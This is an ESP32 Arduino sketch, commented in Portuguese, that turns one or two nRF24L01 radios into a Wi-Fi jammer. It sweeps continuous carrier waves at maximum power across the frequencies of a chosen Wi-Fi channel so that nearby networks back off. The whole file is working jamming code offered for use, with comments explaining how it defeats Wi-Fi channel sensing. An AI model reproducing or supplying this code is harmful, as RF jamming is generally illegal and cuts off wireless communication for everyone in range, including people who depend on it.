#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>

#define PIN_CE_VSPI 22
#define PIN_CSN_VSPI 21
#define PIN_SCK_VSPI 18
#define PIN_MISO_VSPI 19
#define PIN_MOSI_VSPI 23

#define PIN_CE_HSPI 16
#define PIN_CSN_HSPI 15
#define PIN_SCK_HSPI 4
#define PIN_MISO_HSPI 2
#define PIN_MOSI_HSPI 17

SPIClass vspi(VSPI);
SPIClass hspi(HSPI);

RF24 radio(PIN_CE_VSPI, PIN_CSN_VSPI);
RF24 radio2(PIN_CE_HSPI, PIN_CSN_HSPI);

bool has_radio2 = false;

// ===================================
// COLOCAR AQUI O CANAL DO SEU ROTEADOR (1, 6 ou 11 são os mais comuns)
// ===================================
#define TARGET_WIFI_CHANNEL 11

uint8_t min_ch = 1;
uint8_t max_ch = 85;

void setup()
{
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n\n=== WIFI JAMMER (PURA ONDA CONTÍNUA - CW) ===");

    if (TARGET_WIFI_CHANNEL == 0)
    {
        min_ch = 1;
        max_ch = 85;
    }
    else
    {
        int center_freq = 7 + (TARGET_WIFI_CHANNEL * 5);
        min_ch = center_freq - 11;
        max_ch = center_freq + 11;
        if (min_ch < 1)
            min_ch = 1;
        if (max_ch > 125)
            max_ch = 125;
        Serial.printf("Concentrando ONDA CONTINUA entre NRF CH %d e %d\n", min_ch, max_ch);
    }

    vspi.begin(PIN_SCK_VSPI, PIN_MISO_VSPI, PIN_MOSI_VSPI, PIN_CSN_VSPI);
    hspi.begin(PIN_SCK_HSPI, PIN_MISO_HSPI, PIN_MOSI_HSPI, PIN_CSN_HSPI);

    radio.begin(&vspi, PIN_CE_VSPI, PIN_CSN_VSPI);
    radio2.begin(&hspi, PIN_CE_HSPI, PIN_CSN_HSPI);
    has_radio2 = radio2.isChipConnected();

    radio.setAutoAck(false);
    radio.stopListening();

    if (has_radio2)
    {
        radio2.setAutoAck(false);
        radio2.stopListening();
    }

    Serial.println("\n[JAMMER] Executando emissao de energia pura (Carrier Wave)...");
}

void loop()
{
    static unsigned long last_print = 0;
    if (millis() - last_print >= 1000)
    {
        last_print = millis();
        Serial.print("W");
    }

    for (uint8_t ch = min_ch; ch <= max_ch; ch++)
    {
        // Desliga a transportadora para mudar de canal
        radio.stopConstCarrier();
        if (has_radio2)
            radio2.stopConstCarrier();

        // Liga a energia pura no nivel MAXIMO neste exato megahertz
        radio.startConstCarrier(RF24_PA_MAX, ch);

        if (has_radio2)
        {
            uint8_t ch2 = max_ch - (ch - min_ch);
            // Radio 2 faz uma varredura invertida, prendendo as duas extremidades do Wi-Fi channel
            radio2.startConstCarrier(RF24_PA_MAX, ch2);
        }

        // Fica emitindo a onda por 3 milissegundos para forçar o CCA do Wi-Fi a recuar
        delay(3);
    }
}
